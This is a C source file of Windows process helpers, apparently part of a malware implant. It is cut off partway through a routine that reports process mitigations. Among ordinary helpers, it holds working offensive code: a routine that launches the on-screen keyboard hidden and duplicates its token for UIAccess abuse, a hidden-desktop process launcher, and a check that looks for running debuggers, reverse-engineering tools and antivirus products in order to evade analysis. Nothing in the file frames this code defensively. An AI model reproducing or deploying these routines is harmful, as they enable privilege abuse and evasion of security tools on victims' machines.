#include "pch.h"

BOOL Run
(
	_In_ LPWSTR* Argv,
	_In_ DWORD dwArgc,
	_Out_ PHANDLE phProcess
)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	DWORD dwLength = 1;
	UINT i = 0;
	LPWSTR lpCommandLine = NULL;
	BOOL bResult = FALSE;

	SecureZeroMemory(&si, sizeof(si));
	SecureZeroMemory(&pi, sizeof(pi));
	for (i = 0; i < dwArgc; i++) {
		dwLength += (lstrlenW(Argv[i]) + 1);
	}

	lpCommandLine = ALLOC(dwLength * sizeof(WCHAR));
	for (i = 0; i < dwArgc; i++) {
		StrCatBuffW(lpCommandLine, Argv[i], dwLength);
		StrCatBuffW(lpCommandLine, L" ", dwLength);
	}

	lpCommandLine[lstrlenW(lpCommandLine) - 1] = L'\0';
	si.cb = sizeof(si);
	if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		goto END;
	}

	bResult = TRUE;
END:
	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (phProcess != NULL) {
		*phProcess = pi.hProcess;
	}
	else if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	FREE(lpCommandLine);

	return bResult;
}

DWORD GetProcessIdByName
(
	_In_ LPWSTR lpProcessName
)
{
	HANDLE hProc = NULL;
	WCHAR wszTempName[MAX_PATH];
	DWORD cbTempName;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	DWORD dwResult = 0;
	PROCESSENTRY32W ProcessEntry;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		goto END;
	}

	ProcessEntry.dwSize = sizeof(ProcessEntry);
	if (!Process32FirstW(hSnapshot, &ProcessEntry)) {
		goto END;
	}

	do {
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ProcessEntry.th32ProcessID);
		if (hProc == NULL) {
			continue;
		}

		cbTempName = MAX_PATH;
		if (QueryFullProcessImageNameW(hProc, 0, wszTempName, &cbTempName)) {
			if (!StrCmpW(PathFindFileNameW(wszTempName), lpProcessName)) {
				CloseHandle(hProc);
				dwResult = ProcessEntry.th32ProcessID;
				goto END;
			}
		}

		CloseHandle(hProc);
	} while (Process32NextW(hSnapshot, &ProcessEntry));
END:
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		CloseHandle(hSnapshot);
	}

	return dwResult;
}

HANDLE CreateProcessAndStealToken
(
	_In_ LPWSTR lpFilePath
)
{
	SHELLEXECUTEINFOW ShellExeInfo;
	HANDLE hResult = NULL;
	NTSTATUS Status;
	HANDLE hProcessToken = NULL;
	SECURITY_QUALITY_OF_SERVICE SecurityQuality;
	OBJECT_ATTRIBUTES ObjAttr;

	SecureZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
	SecureZeroMemory(&SecurityQuality, sizeof(SecurityQuality));
	ShellExeInfo.cbSize = sizeof(ShellExeInfo);
	ShellExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShellExeInfo.lpFile = lpFilePath;
	ShellExeInfo.nShow = SW_HIDE;

	if (!ShellExecuteExW(&ShellExeInfo)) {
		goto END;
	}

	Status = NtOpenProcessToken(ShellExeInfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
	if (!NT_SUCCESS(Status)) {
		goto END;
	}

	SecurityQuality.Length = sizeof(SecurityQuality);
	SecurityQuality.ImpersonationLevel = SecurityImpersonation;
	SecurityQuality.ContextTrackingMode = 0;
	SecurityQuality.EffectiveOnly = FALSE;
	InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
	ObjAttr.SecurityQualityOfService = &SecurityQuality;
	Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &ObjAttr, FALSE, TokenPrimary, &hResult);
	if (!NT_SUCCESS(Status))
	{
		goto END;
	}

END:
	if (hProcessToken != NULL) {
		CloseHandle(hProcessToken);
	}

	NtTerminateProcess(ShellExeInfo.hProcess, STATUS_SUCCESS);

	if (ShellExeInfo.hProcess != NULL) {
		CloseHandle(ShellExeInfo.hProcess);
	}

	return hResult;
}

HANDLE SetTokenWithUiAccess
(
	_In_ HANDLE hToken
)
{
	SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
	NTSTATUS Status = 0;
	PSID pIntegritySid = NULL;
	TOKEN_MANDATORY_LABEL MandatoryLabel;
	HANDLE hResult = NULL;

	SecureZeroMemory(&MandatoryLabel, sizeof(MandatoryLabel));
	Status = RtlAllocateAndInitializeSid(&MLAuthority, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &pIntegritySid);
	if (!NT_SUCCESS(Status)) {
		goto END;
	}

	MandatoryLabel.Label.Attributes = SE_GROUP_INTEGRITY;
	MandatoryLabel.Label.Sid = pIntegritySid;
	Status = NtSetInformationToken(hToken, TokenIntegrityLevel, &MandatoryLabel, (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
	if (!NT_SUCCESS(Status)) {
		goto END;
	}

	hResult = hToken;
END:

	return hResult;
}

HANDLE GetUiAccessToken(VOID)
{
	HANDLE hToken = NULL;
	WCHAR wszOskPath[MAX_PATH];

	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\osk.exe", wszOskPath, MAX_PATH);
	hToken = CreateProcessAndStealToken(wszOskPath);
	if (hToken == NULL) {
		goto END;
	}

	hToken = SetTokenWithUiAccess(hToken);
	if (hToken == NULL) {
		goto END;
	}

END:
	return hToken;
}

NTSTATUS IsProcessElevated
(
	_In_ ULONG ProcessId,
	_Out_ PBOOL Elevated
)
{
	NTSTATUS Status;
	ULONG Dummy;
	HANDLE ProcessHandle, TokenHandle;
	CLIENT_ID ClientId;
	TOKEN_ELEVATION TokenInfo;
	OBJECT_ATTRIBUTES ObAttr = RTL_INIT_OBJECT_ATTRIBUTES(NULL, 0);

	ClientId.UniqueProcess = UlongToHandle(ProcessId);
	ClientId.UniqueThread = NULL;

	if (Elevated) {
		*Elevated = FALSE;
	}

	Status = NtOpenProcess(&ProcessHandle, MAXIMUM_ALLOWED, &ObAttr, &ClientId);
	if (NT_SUCCESS(Status)) {
		Status = NtOpenProcessToken(ProcessHandle, TOKEN_QUERY, &TokenHandle);
		if (NT_SUCCESS(Status)) {
			TokenInfo.TokenIsElevated = 0;
			Status = NtQueryInformationToken(TokenHandle, TokenElevation, &TokenInfo, sizeof(TOKEN_ELEVATION), &Dummy);

			if (NT_SUCCESS(Status)) {
				if (Elevated) {
					*Elevated = (TokenInfo.TokenIsElevated > 0);
				}
			}

			NtClose(TokenHandle);
		}

		NtClose(ProcessHandle);
	}

	return Status;
}

VOID ReadOutputFromProcess
(
	_In_ HANDLE hPipeRead,
	_In_ HANDLE hProcess,
	_Out_ PBYTE* pBufferPointer,
	_Out_ PDWORD pdwSize
)
{
	BOOL bSuccess = FALSE;
	PBYTE pBuffer = ALLOC(0x1000);
	DWORD dwNumberOfBytesToRead = 0x1000;
	DWORD dwNumberOfBytesRead = 0;
	DWORD dwTotalSize = 0;

	while (TRUE) {
		bSuccess = ReadFile(hPipeRead, &pBuffer[dwTotalSize], dwNumberOfBytesToRead, &dwNumberOfBytesRead, NULL);
		dwTotalSize += dwNumberOfBytesRead;

		if (!bSuccess || dwNumberOfBytesRead == 0) {
			break;
		}

		if (dwNumberOfBytesToRead == dwNumberOfBytesRead) {
			pBuffer = REALLOC(pBuffer, dwNumberOfBytesToRead * 2);
			dwNumberOfBytesRead = 0;
		}
		else {
			break;
		}
	}

	*pBufferPointer = pBuffer;
	*pdwSize = dwTotalSize;
	WaitForSingleObject(hProcess, INFINITE);
	return;
}

BOOL CreateProcessAndGetOutput
(
	_In_ LPWSTR lpCommandLine,
	_Out_ PBYTE* pOutput,
	_Out_ PDWORD pdwSize
)
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	HANDLE hChildStdOutRd = NULL;
	HANDLE hChildStdOutWr = NULL;
	SECURITY_ATTRIBUTES SecAttr;
	BOOL bResult = FALSE;

	SecureZeroMemory(&pi, sizeof(pi));
	SecureZeroMemory(&si, sizeof(si));
	SecureZeroMemory(&SecAttr, sizeof(SecAttr));
	SecAttr.nLength = sizeof(SecAttr);
	SecAttr.bInheritHandle = TRUE;
	SecAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hChildStdOutRd, &hChildStdOutWr, &SecAttr, 0)) {
		goto END;
	}

	if (!SetHandleInformation(hChildStdOutRd, HANDLE_FLAG_INHERIT, 0)) {
		goto END;
	}

	si.cb = sizeof(si);
	si.hStdError = hChildStdOutWr;
	si.hStdOutput = hChildStdOutWr;
	si.dwFlags |= STARTF_USESTDHANDLES;

	if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		goto END;
	}

	ReadOutputFromProcess(hChildStdOutRd, pi.hProcess, pOutput, pdwSize);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	bResult = TRUE;
END:
	return bResult;
}

BOOL CreateProcessWithDesktop
(
	_In_ LPWSTR lpCommandLine,
	_In_ LPWSTR lpDesktopName
)
{
	HDESK hOrigDesk = NULL;
	HDESK hHiddenDesk = NULL;
	BOOL Result = FALSE;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;

	hHiddenDesk = OpenDesktopW(lpDesktopName, 0, TRUE, GENERIC_ALL);
	hOrigDesk = GetThreadDesktop(GetCurrentThreadId());
	if (!hHiddenDesk) {
		RtlSecureZeroMemory(&sa, sizeof(sa));
		sa.nLength = sizeof(sa);
		sa.bInheritHandle = TRUE;
		hHiddenDesk = CreateDesktopW(lpDesktopName, NULL, NULL, 0, GENERIC_ALL, &sa);
		if (hHiddenDesk == NULL) {
			LOG_ERROR("CreateDesktopW", GetLastError());
			goto CLEANUP;
		}
	}

	if (!SetThreadDesktop(hHiddenDesk)) {
		LOG_ERROR("SetThreadDesktop", GetLastError());
		goto CLEANUP;
	}

	if (!SwitchDesktop(hHiddenDesk)) {
		LOG_ERROR("SwitchDesktop", GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.lpDesktop = lpDesktopName;
	Sleep(10000);
	Result = CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	if (!Result) {
		LOG_ERROR("CreateProcessW", GetLastError());
		goto CLEANUP;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
CLEANUP:
	SwitchDesktop(hOrigDesk);
	SetThreadDesktop(hOrigDesk);
	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (hHiddenDesk != NULL) {
		CloseDesktop(hHiddenDesk);
	}

	if (hOrigDesk != NULL) {
		CloseDesktop(hOrigDesk);
	}

	return Result;
}

BOOL AreProcessesRunning
(
	_In_ LPWSTR* pNameList,
	_In_ DWORD dwCount,
	_In_ DWORD dwMin
)
{
	BOOL Result = FALSE;
	DWORD i = 0;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32W ProcEntry;
	LPWSTR* pTempList = NULL;
	DWORD dwNumberOfMatches = 0;

	if (dwMin == 0) {
		dwMin = dwCount;
	}

	if (dwMin > dwCount) {
		goto CLEANUP;
	}

	pTempList = ALLOC(sizeof(LPWSTR) * dwCount);
	for (i = 0; i < dwCount; i++) {
		pTempList[i] = pNameList[i];
	}

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		LOG_ERROR("CreateToolhelp32Snapshot", GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&ProcEntry, sizeof(ProcEntry));
	ProcEntry.dwSize = sizeof(ProcEntry);
	if (!Process32FirstW(hSnapshot, &ProcEntry)) {
		LOG_ERROR("Process32FirstW", GetLastError());
		goto CLEANUP;
	}

	do {
		for (i = 0; i < dwCount; i++) {
			if (pTempList[i] != NULL) {
				if (!StrCmpIW(pTempList[i], ProcEntry.szExeFile)) {
					dwNumberOfMatches++;
					if (dwNumberOfMatches >= dwMin) {
						Result = TRUE;
						goto CLEANUP;
					}

					pTempList[i] = NULL;
				}
			}
		}
	} while (Process32NextW(hSnapshot, &ProcEntry));
CLEANUP:
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		CloseHandle(hSnapshot);
	}

	FREE(pTempList);

	return Result;
}

BOOL CheckForBlackListProcess(VOID)
{
	LPWSTR AvList[] = {L"kav.exe", L"kav32.exe", L"kavfs.exe", L"kavmm.exe", L"klnagent.exe", L"BITDEFENDER.exe", L"bdc.exe", L"bdlite.exe", L"bdagent.exe", L"AvastSvc.exe", L"afwServ.exe", L"ashserv.exe"};
	LPWSTR DebugList[] = { L"ida.exe", L"ida64.exe", L"DbgX.Shell.exe", L"x64dbg.exe", L"x32dbg.exe", L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe", L"apimonitor-x86.exe", L"pin.exe", L"SystemInformer.exe", L"windbg.exe", L"ProcessHacker.exe", L"binaryninja.exe", L"decompile.exe", L"r2r.exe", L"radare2.exe" };
	BOOL Result = FALSE;

	Result = AreProcessesRunning(DebugList, _countof(DebugList), 1);
	if (Result) {
		return TRUE;
	}

	/*Result = AreProcessesRunning(AvList, _countof(AvList), 1);
	if (Result) {
		return TRUE;
	}*/

	return FALSE;
}

LPSTR GetCurrentProcessUserSID(VOID)
{
	HANDLE hToken = NULL;
	PTOKEN_USER pTokenInfo = NULL;;
	DWORD cbTokenInfo = sizeof(TOKEN_USER);
	LPSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	DWORD dwLastError = ERROR_SUCCESS;

	hToken = GetCurrentProcessToken();
	pTokenInfo = ALLOC(cbTokenInfo);
	while (TRUE) {
		if (!GetTokenInformation(hToken, TokenUser, pTokenInfo, cbTokenInfo, &cbTokenInfo)) {
			dwLastError = GetLastError();
			if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
				pTokenInfo = REALLOC(pTokenInfo, cbTokenInfo + 1);
				continue;
			}

			LOG_ERROR("GetTokenInformation", dwLastError);
			goto CLEANUP;
		}

		break;
	}
	
	if (!ConvertSidToStringSidA(pTokenInfo->User.Sid, &lpTemp)) {
		LOG_ERROR("ConvertSidToStringSidA", GetLastError());
		goto CLEANUP;
	}

	lpResult = DuplicateStrA(lpTemp, 0);
CLEANUP:
	FREE(pTokenInfo);
	if (lpTemp != NULL) {
		LocalFree(lpTemp);
	}

	return lpResult;
}

LPSTR GetCurrentProcessGroupSID(VOID)
{
	HANDLE hToken = NULL;
	PTOKEN_PRIMARY_GROUP pTokenInfo = NULL;;
	DWORD cbTokenInfo = sizeof(TOKEN_PRIMARY_GROUP);
	LPSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	DWORD dwLastError = ERROR_SUCCESS;

	hToken = GetCurrentProcessToken();
	pTokenInfo = ALLOC(cbTokenInfo);
	while (TRUE) {
		if (!GetTokenInformation(hToken, TokenPrimaryGroup, pTokenInfo, cbTokenInfo, &cbTokenInfo)) {
			dwLastError = GetLastError();
			if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
				pTokenInfo = REALLOC(pTokenInfo, cbTokenInfo + 1);
				continue;
			}

			LOG_ERROR("GetTokenInformation", GetLastError());
			goto CLEANUP;
		}

		break;
	}

	if (!ConvertSidToStringSidA(pTokenInfo->PrimaryGroup, &lpTemp)) {
		LOG_ERROR("ConvertSidToStringSidA", GetLastError());
		goto CLEANUP;
	}

	lpResult = DuplicateStrA(lpTemp, 0);
CLEANUP:
	FREE(pTokenInfo);
	if (lpTemp != NULL) {
		LocalFree(lpTemp);
	}

	return lpResult;
}

LPSTR DescribeProcessMitigation
(
	_In_ HANDLE hProcess
)
{
	BOOL IsWow64 = FALSE;
	NTSTATUS Status = 0;
	ULONG uDEPFlags = 0;
	ULONG ReturnedLength = 0;
	LPSTR lpResult = NULL;
	PROCESS_MITIGATION_ASLR_POLICY AslrPolicy;
	PROCESS_MITIGATION_DYNAMIC_CODE_POLICY DynamicCodePolicy;
	PROCESS_MITIGATION_STRICT_HANDLE_CHECK_POLICY StrictHandlePolicy;
	PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY SystemCallDisablePolicy;
	PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ExtensionPointDisablePolicy;
	PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY CFGPolicy;
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY BinarySignaturePolicy;
	PROCESS_MITIGATION_FONT_DISABLE_POLICY FontDisablePolicy;
	PROCESS_MITIGATION_IMAGE_LOAD_POLICY ImageLoadPolicy;
	PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY CallFilterPolicy;
	PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY PayloadRestrictionPolicy;
	PROCESS_MITIGATION_CHILD_PROCESS_POLICY ChildProcessPolicy;
	PROCESS_MITIGATION_SIDE_CHANNEL_ISOLATION_POLICY SideChannelIsolationPolicy;
	PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY ShadowStackPolicy;
	PROCESS_MITIGATION_REDIRECTION_TRUST_POLICY RedirectionTrustPolicy;
	PROCESS_MITIGATION_USER_POINTER_AUTH_POLICY UserPointerAuthPolicy;
	PROCESS_MITIGATION_SEHOP_POLICY SEHPolicy;
	PROCESS_MITIGATION_POLICY_INFORMATION PolicyInfo;

	if (!IsWow64Process(hProcess, &IsWow64)) {
		LOG_ERROR("IsWow64Process", GetLastError());
		goto CLEANUP;
	}

	if (!IsWow64) {
		uDEPFlags = MEM_EXECUTE_OPTION_ENABLE | MEM_EXECUTE_OPTION_PERMANENT;
	}
	else {
		Status = NtQueryInformationProcess(hProcess, ProcessExecuteFlags, &uDEPFlags, sizeof(uDEPFlags), &ReturnedLength);
		if (!NT_SUCCESS(Status) && Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}

	if (uDEPFlags & MEM_EXECUTE_OPTION_ENABLE) {
		lpResult = StrCatExA(lpResult, "DEP");
		if ((uDEPFlags & MEM_EXECUTE_OPTION_PERMANENT) || (uDEPFlags & MEM_EXECUTE_OPTION_DISABLE_THUNK_EMULATION)) {
			lpResult = StrCatExA(lpResult, " (");
			if (uDEPFlags & MEM_EXECUTE_OPTION_PERMANENT) {
				lpResult = StrCatExA(lpResult, "permanent, ");
			}

			if (uDEPFlags & MEM_EXECUTE_OPTION_DISABLE_THUNK_EMULATION) {
				lpResult = StrCatExA(lpResult, "ATL thunk emulation is disabled, ");
			}

			lpResult[lstrlenA(lpResult) - 2] = '\0';
			lpResult = StrCatExA(lpResult, "), ");
		}
	}

	PolicyInfo.Policy = ProcessASLRPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&AslrPolicy, &PolicyInfo.ASLRPolicy, sizeof(AslrPolicy));
		lpResult = StrCatExA(lpResult, "ASLR");
		if (AslrPolicy.EnableHighEntropy != 0 || AslrPolicy.EnableForceRelocateImages != 0 || AslrPolicy.DisallowStrippedImages != 0) {
			lpResult = StrCatExA(lpResult, " (");
			if (AslrPolicy.EnableHighEntropy) {
				lpResult = StrCatExA(lpResult, "high entropy, ");
			}

			if (AslrPolicy.EnableForceRelocateImages) {
				lpResult = StrCatExA(lpResult, "force relocate, ");
			}

			if (AslrPolicy.DisallowStrippedImages) {
				lpResult = StrCatExA(lpResult, "disallow stripped, ");
			}

			lpResult[lstrlenA(lpResult) - 2] = '\0';
			lpResult = StrCatExA(lpResult, ")");
		}

		lpResult = StrCatExA(lpResult, ", ");
	}

	PolicyInfo.Policy = ProcessDynamicCodePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&DynamicCodePolicy, &PolicyInfo.DynamicCodePolicy, sizeof(DynamicCodePolicy));
		if (DynamicCodePolicy.ProhibitDynamicCode) {
			lpResult = StrCatExA(lpResult, "Dynamic code prohibited, ");
		}
		else if (DynamicCodePolicy.AllowThreadOptOut) {
			lpResult = StrCatExA(lpResult, "Dynamic code prohibited (per-thread), ");
		}
		else if (DynamicCodePolicy.AllowRemoteDowngrade) {
			lpResult = StrCatExA(lpResult, "Dynamic code downgradable, ");
		}
	}

	PolicyInfo.Policy = ProcessStrictHandleCheckPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&StrictHandlePolicy, &PolicyInfo.StrictHandleCheckPolicy, sizeof(StrictHandlePolicy));
		if (StrictHandlePolicy.RaiseExceptionOnInvalidHandleReference) {
			lpResult = StrCatExA(lpResult, "Strict handle checks, ");
		}
	}

	PolicyInfo.Policy = ProcessSystemCallDisablePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&SystemCallDisablePolicy, &PolicyInfo.SystemCallDisablePolicy, sizeof(SystemCallDisablePolicy));
		if (SystemCallDisablePolicy.AuditDisallowWin32kSystemCalls) {
			lpResult = StrCatExA(lpResult, "Win32k system calls (Audit), ");
		}
		else if (SystemCallDisablePolicy.DisallowWin32kSystemCalls) {
			lpResult = StrCatExA(lpResult, "Win32k system calls disabled, ");
		}
	}

	PolicyInfo.Policy = ProcessExtensionPointDisablePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&ExtensionPointDisablePolicy, &PolicyInfo.ExtensionPointDisablePolicy, sizeof(ExtensionPointDisablePolicy));
		if (ExtensionPointDisablePolicy.DisableExtensionPoints) {
			lpResult = StrCatExA(lpResult, "Extension points disabled, ");
		}
	}

	PolicyInfo.Policy = ProcessControlFlowGuardPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&CFGPolicy, &PolicyInfo.ControlFlowGuardPolicy, sizeof(CFGPolicy));
		if (CFGPolicy.StrictMode) {
			lpResult = StrCatExA(lpResult, "Strict ");
		}

		if (CFGPolicy.EnableXfgAuditMode) {
			lpResult = StrCatExA(lpResult, "Audit ");
		}

		if (CFGPolicy.EnableXfg) {
			lpResult = StrCatExA(lpResult, "XF Guard, ");
		}
		else {
			lpResult = StrCatExA(lpResult, "CF Guard, ");
		}
	}

	PolicyInfo.Policy = ProcessSignaturePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&BinarySignaturePolicy, &PolicyInfo.SignaturePolicy, sizeof(BinarySignaturePolicy));
		if ((BinarySignaturePolicy.MicrosoftSignedOnly) || (BinarySignaturePolicy.StoreSignedOnly)) {
			lpResult = StrCatExA(lpResult, "Signatures restricted (");
			if (BinarySignaturePolicy.MicrosoftSignedOnly) {
				lpResult = StrCatExA(lpResult, "Microsoft only, ");
			}

			if (BinarySignaturePolicy.StoreSignedOnly) {
				lpResult = StrCatExA(lpResult, "Store only, ");
			}

			lpResult[lstrlenA(lpResult) - 2] = '\0';
			lpResult = StrCatExA(lpResult, "), ");
		}
	}

	PolicyInfo.Policy = ProcessFontDisablePolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&FontDisablePolicy, &PolicyInfo.FontDisablePolicy, sizeof(FontDisablePolicy));
		if (FontDisablePolicy.DisableNonSystemFonts) {
			lpResult = StrCatExA(lpResult, "Non-system fonts disabled, ");
		}
	}

	PolicyInfo.Policy = ProcessImageLoadPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&ImageLoadPolicy, &PolicyInfo.ImageLoadPolicy, sizeof(ImageLoadPolicy));
		if ((ImageLoadPolicy.NoRemoteImages) || (ImageLoadPolicy.NoLowMandatoryLabelImages)) {
			lpResult = StrCatExA(lpResult, "Images restricted");
			lpResult = StrCatExA(lpResult, " (");
			if (ImageLoadPolicy.NoRemoteImages) {
				lpResult = StrCatExA(lpResult, "remote images, ");
			}

			if (ImageLoadPolicy.NoLowMandatoryLabelImages) {
				lpResult = StrCatExA(lpResult, "low mandatory label images, ");
			}

			lpResult[lstrlenA(lpResult) - 2] = '\0';
			lpResult = StrCatExA(lpResult, ")");
			lpResult = StrCatExA(lpResult, ", ");
		}
	}

	PolicyInfo.Policy = ProcessSystemCallFilterPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&CallFilterPolicy, &PolicyInfo.SystemCallFilterPolicy, sizeof(CallFilterPolicy));
		if (CallFilterPolicy.FilterId) {
			lpResult = StrCatExA(lpResult, "System call filtering, ");
		}
	}

	PolicyInfo.Policy = ProcessPayloadRestrictionPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&PayloadRestrictionPolicy, &PolicyInfo.PayloadRestrictionPolicy, sizeof(PayloadRestrictionPolicy));
		if (PayloadRestrictionPolicy.EnableExportAddressFilter || PayloadRestrictionPolicy.EnableExportAddressFilterPlus ||
			PayloadRestrictionPolicy.EnableImportAddressFilter || PayloadRestrictionPolicy.EnableRopStackPivot ||
			PayloadRestrictionPolicy.EnableRopCallerCheck || PayloadRestrictionPolicy.EnableRopSimExec)
		{
			lpResult = StrCatExA(lpResult, "Payload restrictions, ");
		}
	}

	PolicyInfo.Policy = ProcessChildProcessPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
	}
	else {
		memcpy(&ChildProcessPolicy, &PolicyInfo.ChildProcessPolicy, sizeof(ChildProcessPolicy));
		if (ChildProcessPolicy.NoChildProcessCreation) {
			lpResult = StrCatExA(lpResult, "Child process creation disabled, ");
		}
	}

	PolicyInfo.Policy = ProcessSideChannelIsolationPolicy;
	Status = NtQueryInformationProcess(hProcess, ProcessMitigationPolicy, &PolicyInfo, sizeof(PolicyInfo), &ReturnedLength);
	if (!NT_SUCCESS(Status)) {
		if (Status != STATUS_NONE_MAPPED && Status != STATUS_NOT_SUPPORTED) {
			LOG_ERROR("NtQueryInformationProcess", Status);
			goto CLEANUP;
		}
